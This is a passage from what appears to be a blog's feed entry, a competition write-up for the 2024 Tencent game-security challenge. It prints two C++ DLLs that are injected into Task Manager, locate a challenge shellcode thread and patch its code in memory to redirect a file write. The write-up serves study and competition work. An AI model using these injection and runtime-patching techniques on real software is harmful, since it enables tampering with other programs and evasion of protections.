class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_THREADINFOCLASS</span>&#123;</span><br><span class="line">    ThreadBasicInformation,</span><br><span class="line">    ThreadTimes,</span><br><span class="line">    ThreadPriority,</span><br><span class="line">    ThreadBasePriority,</span><br><span class="line">    ThreadAffinityMask,</span><br><span class="line">    ThreadImpersonationToken,</span><br><span class="line">    ThreadDescriptorTableEntry,</span><br><span class="line">    ThreadEnableAlignmentFaultFixup,</span><br><span class="line">    ThreadEventPair_Reusable,</span><br><span class="line">    ThreadQuerySetWin32StartAddress,</span><br><span class="line">    ThreadZeroTlsCell,</span><br><span class="line">    ThreadPerformanceCount,</span><br><span class="line">    ThreadAmILastThread,</span><br><span class="line">    ThreadIdealProcessor,</span><br><span class="line">    ThreadPriorityBoost,</span><br><span class="line">    ThreadSetTlsArrayAddress,</span><br><span class="line">    ThreadIsIoPending,</span><br><span class="line">    ThreadHideFromDebugger,</span><br><span class="line">    ThreadBreakOnTermination,</span><br><span class="line">    MaxThreadInfoClass</span><br><span class="line">&#125;THREADINFOCLASS;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span>&#123;</span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125;CLIENT_ID;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span>&#123;</span><br><span class="line">    LONG ExitStatus;</span><br><span class="line">    PVOID TebBaseAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    LONG AffinityMask;</span><br><span class="line">    LONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">&#125;THREAD_BASIC_INFORMATION,*PTHREAD_BASIC_INFORMATION;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="built_in">LONG</span> (__stdcall *ZwQueryInformationThread)(</span><br><span class="line">    IN HANDLE ThreadHandle,</span><br><span class="line">    IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">    OUT PVOID ThreadInformation,</span><br><span class="line">    IN ULONG ThreadInformationLength,</span><br><span class="line">    OUT PULONG ReturnLength OPTIONAL</span><br><span class="line">    ) = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BYTE CODE[] = &#123;</span><br><span class="line">    <span class="number">0x40</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x20</span>,<span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0xD9</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xC9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">BOOL <span class="title">hack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    HANDLE hThreadSnap = INVALID_HANDLE_VALUE; </span><br><span class="line">    THREADENTRY32 te32; </span><br><span class="line">    DWORD dwOwnerPID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">    hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>( TH32CS_SNAPTHREAD, <span class="number">0</span> ); </span><br><span class="line">    <span class="keyword">if</span>( hThreadSnap == INVALID_HANDLE_VALUE ) </span><br><span class="line">    <span class="keyword">return</span>( FALSE ); </span><br><span class="line">    </span><br><span class="line">    te<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(THREADENTRY32 ); </span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">Thread32First</span>( hThreadSnap, &amp;te32 ) ) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>( hThreadSnap );     <span class="comment">// Must clean up the snapshot object!</span></span><br><span class="line">        <span class="keyword">return</span>( FALSE );</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG64 StartAddress;</span><br><span class="line">    DWORD dwReturnLength;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>( te<span class="number">32.</span>th32OwnerProcessID == dwOwnerPID )</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (te<span class="number">32.</span>th32OwnerProcessID) &#123;</span><br><span class="line">                HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, te<span class="number">32.</span>th32ThreadID);</span><br><span class="line">                <span class="keyword">if</span> (hThread != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">                    HINSTANCE hNTDLL = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll&quot;</span>);</span><br><span class="line">                    (FARPROC&amp;)ZwQueryInformationThread  = ::<span class="built_in">GetProcAddress</span>(hNTDLL,<span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">                    PVOID startaddr;<span class="comment">// 用来接收线程入口地址</span></span><br><span class="line"><span class="built_in">ZwQueryInformationThread</span>(</span><br><span class="line">hThread,<span class="comment">// 线程句柄</span></span><br><span class="line">ThreadQuerySetWin32StartAddress,<span class="comment">// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址</span></span><br><span class="line">&amp;startaddr,<span class="comment">// 指向缓冲区的指针</span></span><br><span class="line"><span class="built_in">sizeof</span>(startaddr),<span class="comment">// 缓冲区的大小</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(startaddr,CODE,<span class="built_in">sizeof</span>(CODE))) &#123;</span><br><span class="line">                        <span class="type">char</span> msg[<span class="number">0x50</span>];</span><br><span class="line">                        <span class="built_in">sprintf</span>(msg, <span class="string">&quot;Found the Shellcode in address:%p&quot;</span>, startaddr);</span><br><span class="line">                        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, msg, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">                        <span class="built_in">sprintf</span>(msg, <span class="string">&quot;Replace The byte %02x to 0x01 in addr %p\n&quot;</span>,*((BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>) ,(BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>);</span><br><span class="line">                        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, msg, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">                        *((BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">return</span> TRUE;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span>( <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32 ) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Don&#x27;t forget to clean up the snapshot object.</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>( hThreadSnap );</span><br><span class="line">    <span class="keyword">return</span>( FALSE );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">hack</span>()) &#123;</span><br><span class="line">            <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Fail&quot;</span>, <span class="string">&quot;FAIL&quot;</span>, MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Success&quot;</span>, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行 hack.exe 之后，运行 Xinject.exe 即可达到如下效果：</p><img src="/2024/04/15/tencent-race-2024-pre/13.png" class=""><p>注入结束之后可以看到马上创建了文件。</p><img src="/2024/04/15/tencent-race-2024-pre/14.png" class=""><p>第二题就完整地实现了。</p><p>附件说明：</p><ul><li>Xsafe2.sys：加载用于实现 token2 的输出</li><li>Xinject.exe：用于将下面模块注入 Taskmgr.exe</li><li>Xhack2.dll（运行时应改名为 XHack.dll）：用于修改代码实现 token1 的输出</li></ul><h4 id="（3）编写程序，运行时修改尽量少的内存，让shellcode-往自行指定的位置写入token1成功。（满分3分）"><a href="#（3）编写程序，运行时修改尽量少的内存，让shellcode-往自行指定的位置写入token1成功。（满分3分）" class="headerlink" title="（3）编写程序，运行时修改尽量少的内存，让shellcode 往自行指定的位置写入token1成功。（满分3分）"></a>（3）编写程序，运行时修改尽量少的内存，让shellcode 往自行指定的位置写入token1成功。（满分3分）</h4><p>其实还是 hook 这个地方，改它的写入文件名即可，这里我又注意到</p><img src="/2024/04/15/tencent-race-2024-pre/15.png" class=""><p>往下顺着看，它把RAX写到了 RBP+0x20 的位置，但是最后又对它写了第五个参数，因此基本可以认为这个指令是无用的，尝试去进程分配一块内存，在这个地方将 RCX 的值赋值给它即可达成任意位置的写入。</p><p>这个指令位置在 StartRoutine - 0x5ddb - 0x67 处。</p><p>用下面的代码编译出 <code>XHack.dll</code> （运行时需要改名为这个，用第二题的注入器，附件中的文件名为 XHack3.dll）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Dest <span class="string">&quot;C:\\hijackedByXia0ji233.token1&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_THREADINFOCLASS</span>&#123;</span><br><span class="line">    ThreadBasicInformation,</span><br><span class="line">    ThreadTimes,</span><br><span class="line">    ThreadPriority,</span><br><span class="line">    ThreadBasePriority,</span><br><span class="line">    ThreadAffinityMask,</span><br><span class="line">    ThreadImpersonationToken,</span><br><span class="line">    ThreadDescriptorTableEntry,</span><br><span class="line">    ThreadEnableAlignmentFaultFixup,</span><br><span class="line">    ThreadEventPair_Reusable,</span><br><span class="line">    ThreadQuerySetWin32StartAddress,</span><br><span class="line">    ThreadZeroTlsCell,</span><br><span class="line">    ThreadPerformanceCount,</span><br><span class="line">    ThreadAmILastThread,</span><br><span class="line">    ThreadIdealProcessor,</span><br><span class="line">    ThreadPriorityBoost,</span><br><span class="line">    ThreadSetTlsArrayAddress,</span><br><span class="line">    ThreadIsIoPending,</span><br><span class="line">    ThreadHideFromDebugger,</span><br><span class="line">    ThreadBreakOnTermination,</span><br><span class="line">    MaxThreadInfoClass</span><br><span class="line">&#125;THREADINFOCLASS;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span>&#123;</span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125;CLIENT_ID;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span>&#123;</span><br><span class="line">    LONG ExitStatus;</span><br><span class="line">    PVOID TebBaseAddress;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    LONG AffinityMask;</span><br><span class="line">    LONG Priority;</span><br><span class="line">    LONG BasePriority;</span><br><span class="line">&#125;THREAD_BASIC_INFORMATION,*PTHREAD_BASIC_INFORMATION;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="built_in">LONG</span> (__stdcall *ZwQueryInformationThread)(</span><br><span class="line">    IN HANDLE ThreadHandle,</span><br><span class="line">    IN THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">    OUT PVOID ThreadInformation,</span><br><span class="line">    IN ULONG ThreadInformationLength,</span><br><span class="line">    OUT PULONG ReturnLength OPTIONAL</span><br><span class="line">    ) = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BYTE CODE[] = &#123;</span><br><span class="line">    <span class="number">0x40</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x20</span>,<span class="number">0x48</span>,<span class="number">0x8B</span>,<span class="number">0xD9</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xC9</span></span><br><span class="line">&#125;;</span><br><span class="line">BYTE HACKCODE[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span><span class="comment">//mov RCX,xxx</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">BOOL <span class="title">hack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    HANDLE hThreadSnap = INVALID_HANDLE_VALUE; </span><br><span class="line">    THREADENTRY32 te32; </span><br><span class="line">    DWORD dwOwnerPID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">    hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>( TH32CS_SNAPTHREAD, <span class="number">0</span> ); </span><br><span class="line">    <span class="keyword">if</span>( hThreadSnap == INVALID_HANDLE_VALUE ) </span><br><span class="line">    <span class="keyword">return</span>( FALSE ); </span><br><span class="line">    </span><br><span class="line">    te<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(THREADENTRY32 ); </span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">Thread32First</span>( hThreadSnap, &amp;te32 ) ) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>( hThreadSnap );     <span class="comment">// Must clean up the snapshot object!</span></span><br><span class="line">        <span class="keyword">return</span>( FALSE );</span><br><span class="line">    &#125;</span><br><span class="line">    ULONG64 StartAddress;</span><br><span class="line">    DWORD dwReturnLength;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>( te<span class="number">32.</span>th32OwnerProcessID == dwOwnerPID )</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (te<span class="number">32.</span>th32OwnerProcessID) &#123;</span><br><span class="line">                HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, te<span class="number">32.</span>th32ThreadID);</span><br><span class="line">                <span class="keyword">if</span> (hThread != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">                    HINSTANCE hNTDLL = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll&quot;</span>);</span><br><span class="line">                    (FARPROC&amp;)ZwQueryInformationThread  = ::<span class="built_in">GetProcAddress</span>(hNTDLL,<span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">                    PVOID startaddr;<span class="comment">// 用来接收线程入口地址</span></span><br><span class="line"><span class="built_in">ZwQueryInformationThread</span>(</span><br><span class="line">hThread,<span class="comment">// 线程句柄</span></span><br><span class="line">ThreadQuerySetWin32StartAddress,<span class="comment">// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址</span></span><br><span class="line">&amp;startaddr,<span class="comment">// 指向缓冲区的指针</span></span><br><span class="line"><span class="built_in">sizeof</span>(startaddr),<span class="comment">// 缓冲区的大小</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(startaddr,CODE,<span class="built_in">sizeof</span>(CODE))) &#123;</span><br><span class="line">                        <span class="type">char</span> msg[<span class="number">0x50</span>];</span><br><span class="line">                        <span class="built_in">sprintf</span>(msg, <span class="string">&quot;Found the Shellcode in address:%p&quot;</span>, startaddr);</span><br><span class="line">                        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, msg, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">                        <span class="built_in">sprintf</span>(msg, <span class="string">&quot;Replace The byte %02x to 0x01 in addr %p\n&quot;</span>,*((BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>) ,(BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>);</span><br><span class="line">                        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, msg, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">                        *((BYTE*)startaddr - <span class="number">0x5ddb</span> + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                        LPVOID buffer=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">                        <span class="built_in">memcpy</span>(buffer, Dest, <span class="built_in">sizeof</span>(Dest));</span><br><span class="line">                        *(ULONG64*)(HACKCODE + <span class="number">2</span>) = (ULONG64)buffer;</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">memcpy</span>((BYTE*)startaddr - <span class="number">0x5ddb</span> - <span class="number">0x67</span>, HACKCODE, <span class="built_in">sizeof</span>(HACKCODE));</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;PATH replace to &quot;</span> Dest, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">                        <span class="keyword">return</span> TRUE;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span>( <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32 ) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Don&#x27;t forget to clean up the snapshot object.</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>( hThreadSnap );</span><br><span class="line">    <span class="keyword">return</span>( FALSE );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">hack</span>()) &#123;</span><br><span class="line">            <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Fail&quot;</span>, <span class="string">&quot;FAIL&quot;</span>, MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Success&quot;</span>, <span class="string">&quot;Success&quot;</span>, MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先分配一个内存，写入地址，再构造 <code>mov rcx,xxx</code> 指令，最后替换到指定位置即可。</p><img src="/2024/04/15/tencent-race-2024-pre/16.png" class=""><p>内容也非常完美没有被改变</p><img src="/2024/04/15/tencent-race-2024-pre/17.png" class=""><p>4，5如上所示，源代码均在本文中提供，在打包的可执行文件中：</p><p>总共的附件说明：</p><ul><li>XSafe2.sys：加载后输出token2</li><li>Xinject.exe：注入任务管理器的注入器（2，3题通用）</li><li>XHack2.dll：实现第二题的dll（运行时需改名为XHack.dll，且与注入器在同一目录下）</li><li>XHack3.dll：实现第三题的dll（运行时需改名为XHack.dll，且与注入器在同一目录下）</li></ul><h2 id="花絮"><a href="#花絮" class="headerlink" title="花絮"></a>花絮</h2><p>三天没打满，中间一天抽空去拿了个ACM省赛。</p><img src="/2024/04/15/tencent-race-2024-pre/18.png" class=""><p>然后第二天又接到调剂复试通知赶路去了。</p><img src="/2024/04/15/tencent-race-2024-pre/19.png" class=""><p>不过最后好在还是赶着最后完成了赛题 233。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.ctyun.cn/zhishi/p-233867">https://www.ctyun.cn/zhishi/p-233867</a></p>]]></content>
    
    
    <summary type="html">报名参加了一下2024的游戏安全竞赛</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2020初赛题解</title>
    <link href="https://xia0ji233.github.io/2024/03/30/tencent-race-2020-pre/"/>
    <id>https://xia0ji233.github.io/2024/03/30/tencent-race-2020-pre/</id>
    <published>2024-03-29T17:00:00.000Z</published>
